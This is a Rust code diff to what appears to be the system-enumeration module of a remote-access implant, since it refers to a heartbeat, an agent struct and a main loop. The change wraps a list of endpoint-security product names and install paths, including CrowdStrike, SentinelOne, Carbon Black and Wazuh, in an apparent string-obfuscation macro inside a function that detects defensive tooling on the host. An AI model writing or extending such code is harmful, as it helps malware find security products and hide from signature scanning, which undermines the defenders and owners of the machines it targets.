@@ -1,6 +1,8 @@
 //! Cross-platform system enumeration.
 //! Returns the heartbeat string and an AgentInfo struct used by the main loop.
 
+use crate::s;
+
 pub struct AgentInfo {
     pub hostname: String,
     pub username: String,
@@ -403,19 +405,19 @@ pub fn full_sysinfo() -> String {
 #[cfg(unix)]
 fn detect_edr_av() -> String {
     let edr_processes = [
-        "osqueryd", "auditd", "falco", "wazuh", "ossec",
-        "crowdstrike", "sentinelone", "carbonblack", "cortex",
-        "elastic-agent", "filebeat", "auditbeat",
+        s!("osqueryd"), s!("auditd"), s!("falco"), s!("wazuh"), s!("ossec"),
+        s!("crowdstrike"), s!("sentinelone"), s!("carbonblack"), s!("cortex"),
+        s!("elastic-agent"), s!("filebeat"), s!("auditbeat"),
     ];
     let edr_paths = [
-        "/opt/osquery",
-        "/opt/wazuh",
-        "/opt/falco",
-        "/var/ossec",
-        "/opt/CrowdStrike",
-        "/opt/SentinelOne",
-        "/opt/carbonblack",
-        "/.fleet",
+        s!("/opt/osquery"),
+        s!("/opt/wazuh"),
+        s!("/opt/falco"),
+        s!("/var/ossec"),
+        s!("/opt/CrowdStrike"),
+        s!("/opt/SentinelOne"),
+        s!("/opt/carbonblack"),
+        s!("/.fleet"),
     ];
 
     let mut detections = Vec::new();
@@ -438,8 +440,9 @@ fn detect_edr_av() -> String {
     }
 
     for path in &edr_paths {
-        if std::path::Path::new(path).exists() {
-            if !detections.iter().any(|d| d.contains(&path[..5].to_string())) {
+        if std::path::Path::new(path.as_str()).exists() {
+            let prefix = if path.len() >= 5 { &path[..5] } else { path.as_str() };
+            if !detections.iter().any(|d: &String| d.contains(prefix)) {
                 detections.push(format!("{}*", path));
             }
         }
